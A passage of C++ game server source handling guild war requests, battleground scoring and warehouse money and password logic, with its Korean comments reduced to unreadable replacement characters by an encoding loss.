		if( lpNode != NULL && lpNode->lpTargetGuildNode != NULL )
		{	// �渶�� �������ῡ ���� ���д� ������� ���� �Ѵ�
			if( lpNode->PlayScore == 0  &&  lpNode->lpTargetGuildNode->PlayScore == 0 )
			{	// ������ �������� ���º� ó��
				r1 = 0x06;
				r2 = 0x06;
			}
			else
			{
				r1 = 0x00;
				r2 = 0x01;
			}			
			/*
			if( lpNode->PlayScore < lpNode->lpTargetGuildNode->PlayScore )
			{
				r1 = 0x00;
				r2 = 0x01;
			}
			else if( lpNode->PlayScore > lpNode->lpTargetGuildNode->PlayScore )
			{
				r1 = 0x01;
				r2 = 0x00;
			}
			*/
		}		
		
		if( lpNode->WarType == BTT_SOCCER )
		{
			gBattleGroundEnable(lpNode->BattleGroundIndex, 0);	
#ifdef _NEW_EXDB_
			gObjGuildWarEndSend(lpNode, lpNode->lpTargetGuildNode, r1, r2);
			gObjGuildWarEnd(lpNode, lpNode->lpTargetGuildNode);
#endif
			cManager.BattleInfoSend(GetBattleTeamName(0, 0), 255, GetBattleTeamName(0, 1), 255);
		}
		else
		{
#ifdef _NEW_EXDB_
			gObjGuildWarEndSend(lpNode, lpNode->lpTargetGuildNode, r1, r2);	
			gObjGuildWarEnd(lpNode, lpNode->lpTargetGuildNode);
#endif
		}
	}
}


// ��ڰ� ������ ��� ������ ��Ų��.
void GCManagerGuildWarSet(char *GuildName1, char *GuildName2, int type)
{
	// ù��° ��尡 �ִ��� üũ
	LPGUILD_INFO lpNode = Guild.SearchGuild(GuildName1);
	
	if( lpNode == NULL ) return;
	
	int n=0;
	int warmaster=-1;
	
	// ��� ����� �����Ͱ� �����ϴ°�?
	while( 1 )
	{
		if( gObj[n].Type == OBJTYPE_CHARACTER )
		{
			if( gObj[n].Connected > 2 )
			{
				if( gObj[n].Name[0] == lpNode->Names[0][0] )
				{
					if( strcmp(gObj[n].Name, lpNode->Names[0] ) == 0 ) // �渶�ϋ�..
					{
						warmaster = n;
						break;
					}
				}
			}
		}
		if( n < MAX_OBJECT-1 ) n++;
		else break;
	}
	if( warmaster >= 1 )	// ��� ��帶���Ͱ� �����Ѵٸ�.. ���Ｑ��
	{
		GCGuildWarRequestResult(GuildName2, warmaster, type);
	}
}

// SC [0x60] ������ ��û�� ��� 
void GCGuildWarRequestResult(char *GuildName, int aIndex, int type)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif

	PMSG_GUILDWARREQUEST_RESULT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x60, sizeof( pMsg ));

	pMsg.Result     = 0x03;
	
	if( gObj[aIndex].GuildNumber < 1 )
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}
	LPGUILD_INFO lpMyGuild = gObj[aIndex].lpGuild;
	
	if( lpMyGuild == NULL ) 
	{
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}

	if( lpMyGuild->WarState == 1 || lpMyGuild->WarDeclareState == 1 ) 
	{
		pMsg.Result     = 0x04;
		LogAdd(lMsg.Get(490),lpMyGuild->WarState, lpMyGuild->WarDeclareState, lpMyGuild->Name);
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}

#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	if (!gPkLimitFree) {
#endif
	if( gObj[aIndex].m_PK_Level >= 6 )
	{	// ���θ��� ������ ������ �� ����
		pMsg.Result     = 0x04;
		LogAdd("Error on declaring war : GuildMaster Is Murderer 0x04 %s %s",lpMyGuild->Names[0], gObj[aIndex].Name);
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
	}
#endif
	
	// ��� �����Ͱ� �ƴϸ� ������ ������ �� ����.
	if( strcmp(lpMyGuild->Names[0], gObj[aIndex].Name) != 0 )
	{
		pMsg.Result     = 0x05;
		LogAdd(lMsg.Get(491),lpMyGuild->Names[0], gObj[aIndex].Name);
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		return;
	}

#ifdef MODIFY_GUILDWAR_REQUEST_PROCESS_20050704
	// �ڽ��� ��忡�� ������ �����Ҽ� ����.
	char _guildname[MAX_GUILDNAMESTRING+1];

	memset( _guildname, 0, MAX_GUILDNAMESTRING+1);
	memcpy( _guildname, GuildName, MAX_GUILDNAMESTRING);

	if( strncmp(lpMyGuild->Name, GuildName, MAX_GUILDNAMESTRING) == 0 )
	{
		return;
	}
#else
	char _guildname[MAX_GUILDNAMESTRING+1];

	memset( _guildname, 0, MAX_GUILDNAMESTRING+1);
	memcpy( _guildname, GuildName, MAX_GUILDNAMESTRING);

	// �ڽ��� ��忡�� ������ �����Ҽ� ����.
	if( strncmp(lpMyGuild->Name, _guildname, MAX_GUILDNAMESTRING) == 0 )
	{
		return;
	}
#endif

	// ��� ��尡 �ִ��� üũ
	LPGUILD_INFO lpNode = Guild.SearchGuild(_guildname);
	if( lpNode != NULL )
	{
		if( lpNode->WarState == 1 || lpNode->WarDeclareState == 1)	// ��밡 ������ �̶��..
		{
			pMsg.Result     = 0x04;
			LogAdd(lMsg.Get(490),lpNode->WarState, lpNode->WarDeclareState, lpNode->Name);
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			return;
		}

		
#ifdef ADD_NEW_UNION_01_20041006
		// ���� ���ճ����� ������� �� �� ����.
		if( lpMyGuild->iGuildUnion != G_RELATIONSHIP_NONE
			&& lpMyGuild->iGuildUnion == lpNode->iGuildUnion )
		{
			LogAddTD("[U.System][Guildwar] Can't declare guildwar between Same Union (%s / %d) <-> (%s / %d)",
				lpMyGuild->Name, lpMyGuild->iGuildUnion, lpNode->Name, lpMyGuild->iGuildUnion);
			return;
		}
#endif
		
		int n=0;
		int warmaster=-1;

		// ��� ����� �����Ͱ� �����ϴ°�?
		while( 1 )
		{
			if( gObj[n].Type == OBJTYPE_CHARACTER )
			{
				if( gObj[n].Connected > 2 )
				{
					if( gObj[n].Name[0] == lpNode->Names[0][0] )
					{
						if( strcmp(gObj[n].Name, lpNode->Names[0] ) == 0 ) // �渶�ϋ�..
						{
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
							if (!gPkLimitFree) {
#endif
							if( gObj[n].m_PK_Level >= 6 )
							{	// ���θ��� ��� ������ �ΰ�� ������ �Ҽ� ����
								pMsg.Result     = 0x04;
								LogAdd("Error on declaring war : Target GuildMaster Is Murderer 0x04 %s %s",lpMyGuild->Names[0], gObj[aIndex].Name);
								DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
								return;
							}
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
							}
#endif

							warmaster = n;
							break;
						}
					}
				}
			}
			if( n < MAX_OBJECT-1 ) n++;
			else break;
		}
		if( warmaster >= 1 )	// ��� ��帶���Ͱ� �����Ѵٸ�.. ���Ｑ��
		{
#ifdef CHAOSCASTLE_SYSTEM_20040408		// ī���� ĳ�� �ȿ����� ������� ������ �� ����. (�� Ȥ�� ����� �渶�� ĳ���ȿ� ���� ���)
	#ifndef WORLD_TOURNAMENT_EVENT_SETTING			
			if (CHECK_CHAOSCASTLE(gObj[aIndex].MapNumber) || CHECK_CHAOSCASTLE(gObj[warmaster].MapNumber)) {
				GCServerMsgStringSend(lMsg.Get(1223), aIndex, 1);		// "ī���� ĳ�� �ȿ����� ����� ��û�� �� �� �����ϴ�."
				return;
			}
	#endif
#endif

			// ��û �ɼ� üũ 
			if( (gObj[warmaster].m_Option&OPTION_TRADE) != OPTION_TRADE )
			{
				pMsg.Result = 0x04;
				DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
				return;
			}
			pMsg.Result = 0x01;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
			GCGuildWarRequestSend(lpMyGuild->Name, warmaster, type);
			lpMyGuild->WarDeclareState  = 1;
			lpNode->WarDeclareState     = 1;
			lpMyGuild->WarType			= type;
			lpNode->WarType             = type;
			
			LogAddTD(lMsg.Get(492), gObj[aIndex].AccountID, gObj[aIndex].Name, lpMyGuild->Name,lpNode->Name);
			strcpy(lpMyGuild->TargetGuildName, lpNode->Name);
			strcpy(lpNode->TargetGuildName, lpMyGuild->Name);
			lpMyGuild->lpTargetGuildNode = lpNode;
			lpNode->lpTargetGuildNode = lpMyGuild;
	
		}
		else
		{	// ��� �渶�� �������� �ʴ´�.
			pMsg.Result = 0x02;
			DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
		}
	}
	else
	{
		pMsg.Result = 0x00; // ��尡 �������� �ʴ´�.
		DataSend(aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	}
}

// 0x61 �ٸ� ��尡 ������ �����ߴ�.
void GCGuildWarRequestSend(char *GuildName, int aIndex, int type)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif
	
	PMSG_GUILDWARSEND pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x61, sizeof( pMsg ));

	pMsg.Type		= type;
	memcpy(pMsg.GuildName, GuildName, MAX_GUILDNAMESTRING);

	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	LogAddTD(lMsg.Get(493), GuildName);
}

// 0x61 ���� ���� ��û�� ���� ���
void GCGuildWarRequestSendRecv(LPPMSG_GUILDWARSEND_RESULT lpMsg, int aIndex)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif

	PMSG_GUILDWAR_DECLARE pMsg;
	int count=0;
	int g_call = 0;
			
	
	PHeadSetB((LPBYTE)&pMsg, 0x62, sizeof( pMsg ));

	pMsg.Type		= 0;

	//if( gObj[aIndex].GuildNumber < 1 ) return;
	LPGUILD_INFO lpMyNode = gObj[aIndex].lpGuild;

	if( lpMyNode == NULL ) 
	{
		PMSG_GUILDWARREQUEST_RESULT	pResult;
				
		pResult.h.c			= PMHC_BYTE;
		pResult.h.headcode	= 0x60;
		pResult.h.size		= sizeof( pMsg );
		pResult.Result		= 0x00;
		DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}	

#ifdef CHAOSCASTLE_DUAL_GUILDWAR_CHANGE_20040614	
	#ifndef WORLD_TOURNAMENT_EVENT_SETTING		// ���� ��ʸ�Ʈ������ �̺�Ʈ �ʿ�����.. ��⸦ �Ҽ� �ִ�.
		if( lpMyNode->lpTargetGuildNode != NULL && lpMsg->Result != 0x00 )
		{	// ��밡 OK��������
			int iTarGetIndex = lpMyNode->lpTargetGuildNode->Index[0];
			if (CHECK_BLOODCASTLE(gObj[iTarGetIndex].MapNumber) ||		// ����ĳ��
#ifdef CHAOSCASTLE_SYSTEM_20040408
				CHECK_CHAOSCASTLE(gObj[iTarGetIndex].MapNumber) ||		// ī����ĳ��
#endif
#ifdef DEVILSQUARE_EXTEND_20050221		// ���������� �ʹ�ȣ üũ ����
				CHECK_DEVILSQUARE(gObj[iTarGetIndex].MapNumber)			// ����������
#else
				gObj[iTarGetIndex].MapNumber == 9						// ����������
#endif
				)
			{
				PMSG_NOTICE	pNotice;
		#ifdef MODIFY_NOTICE_20040325
				TNotice::MakeNoticeMsgEx( &pNotice, 1, lMsg.Get(1223));		// ī���� ĳ�� �ȿ����� ����� ��û�� �� �� �����ϴ�.
		#else
				pNotice.type = 1;
				wsprintf(pNotice.Notice, lMsg.Get(1223));					// ī���� ĳ�� �ȿ����� ����� ��û�� �� �� �����ϴ�.
				PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
		#endif
				DataSend(aIndex, (LPBYTE)&pNotice, pNotice.h.size);
				lpMsg->Result = 0x00;
			}
		}
	#endif	// #ifdef WORLD_TOURNAMENT_EVENT_SETTING	
#endif

	pMsg.Type = lpMyNode->WarType;
	if( lpMsg->Result == 0x00 )
	{
		if( lpMyNode->lpTargetGuildNode != NULL )
		{
			if( lpMyNode->lpTargetGuildNode->WarDeclareState == 1 )
			{
				lpMyNode->lpTargetGuildNode->WarDeclareState = 0;
				lpMyNode->WarDeclareState = 0;

				PMSG_GUILDWARREQUEST_RESULT	pResult;
				
				
				PHeadSetB((LPBYTE)&pResult, 0x60, sizeof( pResult ));

				pResult.Result		= 0x06;
				if( lpMyNode->lpTargetGuildNode->Index[0] >= 0 )
				{
					DataSend(lpMyNode->lpTargetGuildNode->Index[0], (LPBYTE)&pResult, pResult.h.size);
				}
			}
		}
		return;
	}

	if( lpMyNode->WarDeclareState == 1 )	// ���� ���� ���� ���¸� üũ�ؼ� ���Ｑ���ߴٸ�..
	{   // ��밡 ������?
		if( lpMyNode->lpTargetGuildNode != NULL )
		{
			if( lpMyNode->lpTargetGuildNode->WarDeclareState == 1 )
			{	
				PMSG_TELEPORT pTeleportMsg;
				if( lpMyNode->WarType == BTT_SOCCER )
				{
					PMSG_GUILDWARREQUEST_RESULT	pResult;
					
					lpMyNode->BattleGroundIndex = gCheckBlankBattleGround();
					//lpMyNode->BattleGroundIndex = 0;//gCheckBlankBattleGround();
					switch( lpMyNode->BattleGroundIndex )
					{
					case 0xFF :	// ������� ��á��.

						lpMyNode->WarDeclareState					= 0;
						lpMyNode->WarState							= 0;
						lpMyNode->lpTargetGuildNode->WarDeclareState= 0;
						lpMyNode->lpTargetGuildNode->WarState		= 0;

						PHeadSetB((LPBYTE)&pResult, 0x60, sizeof( pResult ));

						pResult.Result		= 0x04;
						DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
						return;
						//case 0 :	pTeleportMsg.MoveNumber = 51;	
						//			gBSGround[0]->Enable(TRUE);
						//	break;
					default:	pTeleportMsg.MoveNumber = 51;	
						lpMyNode->lpTargetGuildNode->BattleGroundIndex = lpMyNode->BattleGroundIndex;
						
						// �౸�� �̵�
						if( gBSGround[0]->m_BallIndex >= 0 )
							gObjMonsterRegen(&gObj[gBSGround[0]->m_BallIndex]);

						BattleSoccerGoalEnd(0);
						
						lpMyNode->PlayScore = 0;
						lpMyNode->lpTargetGuildNode->PlayScore = 0;

						gBattleGroundEnable(lpMyNode->BattleGroundIndex, TRUE);
						gSetBattleTeamMaster(lpMyNode->BattleGroundIndex, 0, lpMyNode->Name, lpMyNode);
						gSetBattleTeamMaster(lpMyNode->BattleGroundIndex, 1, lpMyNode->lpTargetGuildNode->Name, lpMyNode->lpTargetGuildNode);
						break;
					}
				}
				
				lpMyNode->WarDeclareState					= 2;
				lpMyNode->WarState							= 1;
				lpMyNode->lpTargetGuildNode->WarDeclareState= 2;
				lpMyNode->lpTargetGuildNode->WarState		= 1;
				lpMyNode->PlayScore							= 0;
				lpMyNode->lpTargetGuildNode->PlayScore		= 0;
								
				lpMyNode->BattleTeamCode					= 0;
				lpMyNode->lpTargetGuildNode->BattleTeamCode = 1;

#ifdef WORLD_TOURNAMENT_EVENT_SETTING
				lpMyNode->GuildWarTickCount	 = GetTickCount();
				lpMyNode->lpTargetGuildNode->GuildWarTickCount	 = GetTickCount();
#endif
						
				memset( pMsg.GuildName, 0, MAX_GUILDNAMESTRING);
				memcpy( pMsg.GuildName, lpMyNode->lpTargetGuildNode->Name, MAX_GUILDNAMESTRING);

				pMsg.TeamCode	= lpMyNode->BattleTeamCode;
				count = 0;
				for( int n=0; n<MAX_GUILD; n++)
				{
					if( lpMyNode->Use[n] )
					{
						if( lpMyNode->Index[n] >= 0 )
						{
							g_call = 0;

							// ������ ��쿣 ��Ƽ���� ȣ���Ѵ�.
							if( n > 0 )
							{
								if( lpMyNode->WarType == BTT_SOCCER )
								{
									if( gObj[lpMyNode->Index[0]].PartyNumber >= 0 )
									{
										if( gObj[lpMyNode->Index[0]].PartyNumber == gObj[lpMyNode->Index[n]].PartyNumber )
										{
											g_call = 1;
										}
									}
								}
								else
								{
									g_call = 1;
								}
							}
							else if( n == 0 )
							{
								g_call = 1;
							}
							if( g_call ) 
							{
								DataSend( lpMyNode->Index[n], (LPBYTE)&pMsg, pMsg.h.size);
								LogAddTD(lMsg.Get(494),lpMyNode->Name);
								GCGuildWarScore(lpMyNode->Index[n]);
						
								int x=60;								
								if( lpMyNode->WarType == BTT_SOCCER )
								{
									gObj[lpMyNode->Index[n]].IsInBattleGround = TRUE;

									pTeleportMsg.MoveNumber = 51;
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
									if( gPkLimitFree || gObj[lpMyNode->Index[n]].m_PK_Level < 6 )
#else
									if( gObj[lpMyNode->Index[n]].m_PK_Level < 6 )
#endif
									{	// ���θ��� ��������� �̵� ��ų�� ����
										gObjTeleport(lpMyNode->Index[n], 6, x++, 153);
										count++;
									}
								}
							}							
						}
					}
				}
				memset( pMsg.GuildName, 0, MAX_GUILDNAMESTRING);
				memcpy( pMsg.GuildName, lpMyNode->Name, MAX_GUILDNAMESTRING);


				pMsg.TeamCode	= lpMyNode->lpTargetGuildNode->BattleTeamCode;
				count = 0;
				for( int n=0; n<MAX_GUILD; n++)
				{
					if( lpMyNode->lpTargetGuildNode->Use[n] )
					{
						if( lpMyNode->lpTargetGuildNode->Index[n] >= 0 )
						{
							g_call = 0;

							// ������ ��쿣 ��Ƽ���� ȣ���Ѵ�.
							if( n > 0 )
							{
								if( lpMyNode->WarType == BTT_SOCCER )
								{
									if( gObj[lpMyNode->lpTargetGuildNode->Index[0]].PartyNumber >= 0 )
									{
										if( gObj[lpMyNode->lpTargetGuildNode->Index[0]].PartyNumber == gObj[lpMyNode->lpTargetGuildNode->Index[n]].PartyNumber )
										{
											g_call = 1;
										}
									}
								}
								else
								{
									g_call = 1;
								}
							}
							else if( n == 0 )
							{
								g_call = 1;
							}
							if( g_call ) 
							{
								DataSend( lpMyNode->lpTargetGuildNode->Index[n], (LPBYTE)&pMsg, pMsg.h.size);
								LogAddTD(lMsg.Get(494), lpMyNode->lpTargetGuildNode->Name);
								GCGuildWarScore(lpMyNode->lpTargetGuildNode->Index[n]);

								int x=59;
								if( lpMyNode->lpTargetGuildNode->WarType == BTT_SOCCER )
								{	
#ifdef ADD_PK_LIMIT_FREE_OPTION_20050324
									if( gPkLimitFree || gObj[lpMyNode->lpTargetGuildNode->Index[n]].m_PK_Level < 6 )
#else
									if( gObj[lpMyNode->lpTargetGuildNode->Index[n]].m_PK_Level < 6 )
#endif
									{	// ���θ��� ��������� �̵� ��ų�� ����
										gObj[lpMyNode->lpTargetGuildNode->Index[n]].IsInBattleGround = TRUE;

										gObjTeleport(lpMyNode->lpTargetGuildNode->Index[n], 6, x++, 164);
										//pTeleportMsg.MoveNumber = 52;
										//CGTeleportRecv(&pTeleportMsg, lpMyNode->lpTargetGuildNode->Index[n]);
										count++;
									}
								}
							}
						}
					}			
				}
				cManager.BattleInfoSend(GetBattleTeamName(0, 0), GetBattleTeamScore(0, 0), GetBattleTeamName(0, 1), GetBattleTeamScore(0, 1));
				
				if( lpMyNode->WarType == BTT_SOCCER )
				{
#ifdef WORLD_TOURNAMENT_EVENT_SETTING
					gObjAddMsgSendDelay(&gObj[aIndex], MSG_BSSTART, aIndex, 1000*15);
#else
					gObjAddMsgSendDelay(&gObj[aIndex], MSG_BSSTART, aIndex, 1000*10);
#endif
				
					// ���� �鿡�� 3���Ŀ� ��Ⱑ ���۵��� �˸���.
					GCServerMsgStringSendGuild(lpMyNode->lpTargetGuildNode, lMsg.Get(1154), 1);
					GCServerMsgStringSendGuild(lpMyNode, lMsg.Get(1154), 1);
				}
			}		
		}
	}
}

// 0x62 ������ �����Ѵ�.
void GCGuildWarDeclare(int aIndex, char *_guildname)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif

	PMSG_GUILDWAR_DECLARE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x62, sizeof( pMsg ));

	//pMsg.TeamCode	= 
	memcpy( pMsg.GuildName, _guildname, MAX_GUILDNAMESTRING);
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// 0x63 ������ �Ϸ���.
void GCGuildWarEnd(int aIndex, BYTE result, char *_guildname)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif

	PMSG_GUILDWAR_END	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x63, sizeof( pMsg ));
	pMsg.Result		= result;
	memcpy( pMsg.GuildName, _guildname, MAX_GUILDNAMESTRING);
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// 0x64 ���� ��ο��� ������ �����ش�.
void GCGuildWarScore(int aIndex)
{

#ifdef GAMESERVER_TO_CASTLESIEGESERVER // ������ �߿� ����, ���� ���� ���´�.
	return;
#endif
	
	PMSG_GUILDSCORE	pMsg;

	if( gObj[aIndex].GuildNumber < 1 ) return;

	PHeadSetB((LPBYTE)&pMsg, 0x64, sizeof( pMsg ));
	pMsg.Score1		= 0;
	pMsg.Score2		= 0;
	pMsg.Type		= 0;

	if( gObj[aIndex].lpGuild != NULL )
	{
		pMsg.Score1		= gObj[aIndex].lpGuild->PlayScore;
		LogAdd("Score %s %d", gObj[aIndex].Name, gObj[aIndex].lpGuild->PlayScore);

		if( gObj[aIndex].lpGuild->lpTargetGuildNode != NULL ) 
		{
			pMsg.Score2		= gObj[aIndex].lpGuild->lpTargetGuildNode->PlayScore;
			LogAdd("Target Score %s %d", gObj[aIndex].Name, gObj[aIndex].lpGuild->lpTargetGuildNode->PlayScore);
		}
	}
	
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

//////////////////////////////////////////////////////////////////////////////
// â�� ó��
//////////////////////////////////////////////////////////////////////////////
// [0x81] ���� �Աݽ�Ű�ų� ��ݽ�Ų��.
void CGWarehouseMoneyInOut(int aIndex, LPPMSG_WAREHOUSEMONEYINOUT lpMsg)
{
	int money=0;
	if( gObjIsConnected(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
		return;
	}
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];
	money = lpMsg->Money;

	if( lpObj->m_IfState.state == 0 )
	{
		GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
		return;
	}

#ifdef TRADE_BUG_FIX_CLOSE_WINDOWS_20040727
	if( lpObj->m_IfState.use < 1 || lpObj->m_IfState.type != I_WAREHOUSE ) 
	{
		GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
		LogAdd("[%s][%s] error-L1 : used not Warehouse", gObj[aIndex].AccountID, gObj[aIndex].Name);
		return;
	}
#endif

	switch( lpMsg->Type )
	{
	case 0 :	// �Ա�
		if( money <= 0 || money > 100000000 )
		{
			GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
			return;
		}		
		// 1�� ���� ũ�ٸ� �Ա��� �ȵǰ�..
		if( (lpObj->WarehouseMoney+money > 100000000)  )
		{
			GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
			return;
		}
		// �ڽ��� ���� �ִ��� Ȯ���Ѵ�.
		if( money > lpObj->Money )
		{
			GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
			return;
		}
		lpObj->Money -= money;
		lpObj->WarehouseMoney += money;
		break;
	case 1 :	// ���
		{	
			if( bCanWarehouseLock == TRUE )
			{
				if( lpObj->WarehouseLock == 1 )
				{
					GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
					GCServerMsgStringSend(lMsg.Get(1606), lpObj->m_Index, 1);	
					return;
				}
			}

			if( money <= 0 || money > 100000000 )
			{
				GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
				return;
			}
			if( money > lpObj->WarehouseMoney )
			{
				GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
				return;
			}
			lpObj->WarehouseMoney -= money;
			lpObj->Money += money;

			// â�� ���� ���� ���
#ifdef MASTER_LEVEL_UP_SYSTEM_20070912	// ���շ��� - â�� ���� ����
			int  rZen = GetWarehouseUsedHowMuch( lpObj->Level, lpObj->m_nMasterLevel, lpObj->WarehousePW );
#else
			int  rZen = GetWarehouseUsedHowMuch(lpObj->Level, lpObj->WarehousePW);
#endif

			
#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			if( lpObj->Money-rZen >= 0 )
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			if( lpObj->Money-rZen > 0 )
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			{
				int oldmoney=lpObj->Money;
				lpObj->Money -= rZen;
				GCMoneySend(lpObj->m_Index, lpObj->Money);
				LogAdd("Get WareHouse Money(In Inventory) : %d - %d = %d", oldmoney, rZen, lpObj->Money);
			}
#ifdef MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			else if( lpObj->WarehouseMoney-rZen >= 0 )
#else // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			else if( lpObj->WarehouseMoney-rZen > 0 )
#endif // MODIFY_WAREHOUSE_HIRE_BUGFIX_20090413
			{
				int oldmoney=lpObj->WarehouseMoney;
				lpObj->WarehouseMoney -= rZen;
				LogAdd("Get WareHouse Money(In WareHouse) : %d - %d = %d", oldmoney, rZen, lpObj->WarehouseMoney);
				GCWarehouseInventoryMoneySend(aIndex, 0x01, lpObj->Money, lpObj->WarehouseMoney);
			}
			else
			{
				lpObj->WarehouseMoney += money;
				lpObj->Money -= money;
				GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);

				char msg[255];
				wsprintf(msg, lMsg.Get(1605), rZen);
				GCServerMsgStringSend(msg, lpObj->m_Index, 1);
				return;
			}
		}
		break;
	default :
		GCWarehouseInventoryMoneySend(aIndex, 0x00, 0,0);
		return;
	}

	lpObj->WarehouseCount++;
	GCWarehouseInventoryMoneySend(aIndex, 0x01, lpObj->Money, lpObj->WarehouseMoney);
}

// [0x81] ���� ������Ʈ ��Ų��.
void GCWarehouseInventoryMoneySend(int aIndex, BYTE result, int money, int wmoney)
{
	PMSG_MONEY	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x81, sizeof( pMsg ));
	pMsg.Result     = result;
	pMsg.iMoney		= money; 
	pMsg.wMoney		= wmoney;
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// [0x82] â�� ����� ���ƴ�.
void CGWarehouseUseEnd(int aIndex)
{	
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		return;
	}
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	PMSG_DEFAULT	pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x82, sizeof( pMsg ));
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
	
	gObjItemTextSave(lpObj);
	GDSetWarehouseList(aIndex);
	//GJSetCharacterInfo(lpObj, aIndex);
	GDUserItemSave(lpObj);

	if( lpObj->m_IfState.use && lpObj->m_IfState.type == I_WAREHOUSE )
	{
		lpObj->m_IfState.use   = 0;
		lpObj->m_IfState.state = 0;
		lpObj->WarehouseSave   = FALSE;
	}
}

// [0x83] â���� ���¸� ������.
void GCWarehouseStateSend(int aIndex, BYTE state)
{
	PMSG_WAREHOUSESTATE pMsg;

	PHeadSetB((LPBYTE)&pMsg, 0x83, sizeof( pMsg ));
	pMsg.State      = state;//gObj[aIndex].WarehouseLock;
	DataSend( aIndex, (LPBYTE)&pMsg, pMsg.h.size);
}

// [0x83] ī�����ڽ��� �ִ� �������� ������.
void GCWarehouseRecivePassword(int aIndex, LPPMSG_WAREHOUSEPASSSEND lpMsg)
{	
	int pw;

	if( bCanWarehouseLock == FALSE ) return;

	pw = lpMsg->Pass;
	
	switch( lpMsg->Type )
	{
	case 0 : //�Ϲ� ��й�ȣ 
		if( gObj[aIndex].WarehouseLock )
		{
			if( gObj[aIndex].WarehousePW == pw )
			{
				gObj[aIndex].WarehouseLock = 0;
				//GCWarehouseStateSend(aIndex, gObj[aIndex].WarehouseLock);
				GCWarehouseStateSend(aIndex, 12);
			}
			else 
			{
				GCWarehouseStateSend(aIndex, 10);
			}
		}
		break;
	case 1 : //��� ��й�ȣ
		if( gObj[aIndex].WarehouseLock == 0 || gObj[aIndex].WarehouseLock == 255 )
		{
#ifndef FOR_CHINA		
#ifdef UPDATE_USERPASSWORD_LENGTH_20090424
			char szJoomin[MAX_JOOMINNUMBER_LENGTH+1];
			
			memset( szJoomin, 0 , MAX_JOOMINNUMBER_LENGTH+1);
			memcpy( szJoomin, lpMsg->LastJoominNumber, MAX_JOOMINNUMBER_LENGTH);
#else
			char szJoomin[11];
						
			memset( szJoomin, 0 , 11);
			memcpy( szJoomin, lpMsg->LastJoominNumber, 10);
#endif	// UPDATE_USERPASSWORD_LENGTH_20090424

#ifdef FOR_TAIWAN
			if( gObjTaiwanJoominCheck(aIndex, szJoomin) == FALSE )
#else			
			if( gObjJoominCheck(aIndex, szJoomin) == FALSE )
#endif
			{
				GCWarehouseStateSend(aIndex, 13);
				return;
			}
#endif
			gObj[aIndex].WarehousePW   = pw;			
			gObj[aIndex].WarehouseLock = 0;
			GCWarehouseStateSend(aIndex, 12);
		}
		else
		{
			GCWarehouseStateSend(aIndex, 11);
		}
		break;
	case 2 : //���� ��й�ȣ(�ֹι�ȣ�� �´ٸ� ������Ų��)
		{
#ifdef FOR_CHINA
			if( gObj[aIndex].WarehousePW == pw )
			{
				gObj[aIndex].WarehouseLock = 0;
				gObj[aIndex].WarehousePW   = 0;
				gObj[aIndex].WarehouseUnfailLock = 0;
